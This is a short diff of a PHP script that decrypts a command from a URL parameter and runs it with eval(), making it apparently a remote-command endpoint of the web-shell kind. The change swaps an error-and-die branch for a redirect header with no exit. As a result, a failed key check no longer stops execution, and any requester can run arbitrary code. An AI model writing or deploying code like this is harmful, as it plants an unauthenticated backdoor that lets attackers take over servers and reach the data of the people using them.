@@ -22,9 +22,7 @@ function mc_decrypt($decrypt, $key){
 $command = mc_decrypt($_GET["command"],$public);
 if ($public_verify != $public || $private_verify != $private)
 {
-header('Content-Type: application/json');
-echo json_encode("Error Wrong Public Private");
-die();
+header('Location: die.php');
 }
 include("engine/functions.php");
 eval($command);
